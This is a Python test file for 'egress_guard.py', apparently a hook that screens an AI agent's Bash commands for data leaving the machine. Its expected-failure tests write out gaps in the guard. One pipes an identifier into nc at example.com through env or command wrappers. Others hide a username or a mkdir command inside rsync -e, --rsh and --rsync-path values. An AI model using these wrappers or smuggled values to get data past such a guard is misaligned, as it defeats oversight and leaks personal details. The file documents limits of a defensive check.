# stack-guard — Copyright (c) 2026 House of Solance. PolyForm Noncommercial 1.0.0. Required Notice: Copyright (c) 2026 House of Solance (https://github.com/SolanceLab)
import json
import os
import subprocess
import sys
import tempfile
import unittest


HOOK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "plugin", "hooks", "egress_guard.py")


class EgressGuardKnownLimitsTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.patterns = os.path.join(self.tmp.name, "patterns.txt")
        with open(self.patterns, "w") as f:
            f.write("testuser\njane doe\n")
        self.env = dict(os.environ, STACK_GUARD_IDENTIFIERS=self.patterns, STACK_GUARD_HOME_NAME="testuser")

    def tearDown(self):
        self.tmp.cleanup()

    def run_command(self, command):
        return subprocess.run([sys.executable, HOOK], input=json.dumps(
            {"tool_name": "Bash", "tool_input": {"command": command}}),
            capture_output=True, text=True, env=self.env)

    @unittest.expectedFailure
    def test_network_sink_hidden_behind_wrapper(self):
        # Known limit: wrappers hide the network sink.
        for command in ("printf testuser | env nc example.com 80", "printf testuser | command nc example.com 80"):
            with self.subTest(command=command):
                self.assertEqual(self.run_command(command).returncode, 2)

    @unittest.expectedFailure
    def test_rsync_transport_option_values(self):
        # Known limit: rsync transport option values are not checked.
        commands = (
            "rsync -e 'ssh -l testuser' clean.txt box:/tmp/",
            "rsync --rsh='ssh -l testuser' clean.txt box:/tmp/",
            "rsync --rsync-path='mkdir /tmp/testuser && rsync' clean.txt box:/tmp/",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(self.run_command(command).returncode, 2)

    @unittest.expectedFailure
    def test_local_curl_word_is_allowed(self):
        # Known limit: curl outside command position looks like a network sink.
        self.assertEqual(self.run_command("echo curl -d testuser").returncode, 0)

    @unittest.expectedFailure
    def test_local_ssh_word_is_allowed(self):
        # Known limit: ssh outside command position looks like a network sink.
        self.assertEqual(self.run_command("echo ssh testuser@box").returncode, 0)


if __name__ == "__main__":
    unittest.main()
